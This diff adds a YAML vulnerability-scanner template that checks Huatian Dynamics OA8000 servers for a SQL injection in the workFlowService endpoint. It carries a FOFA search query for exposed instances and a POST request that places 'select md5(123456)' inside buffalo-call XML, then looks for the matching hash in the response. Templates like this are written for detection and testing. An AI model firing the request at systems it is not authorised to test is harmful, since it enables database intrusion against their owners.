@@ -1,0 +1,28 @@
+info:
+  vulId: cnpower_oa8000_sqli
+  detail: 华天动力-OA8000 workFlowService sql注入漏洞
+  fofaQuery: app="华天动力-OA8000"
+rules:
+  - request:
+      payload:
+        - "select md5(123456)"
+      path: "{{rootUrl}}/OAapp/bfapp/buffalo/workFlowService"
+      method: POST
+      headers:
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.67 Safari/537.36
+        Connection: keep-alive
+      redirect: false
+      dataType: text
+      data: "<buffalo-call> \r\n<method>getDataListForTree</method> \r\n<string>{{payload}}</string>\r\n</buffalo-call>"
+    checksCondition: and
+    checks:
+      - checkType: string
+        desireds:
+          - e10adc3949ba59abbe56e057f20f883e
+        place: body
+        condition: and
+
+      - checkType: status
+        desireds:
+          - 200
+        condition: and
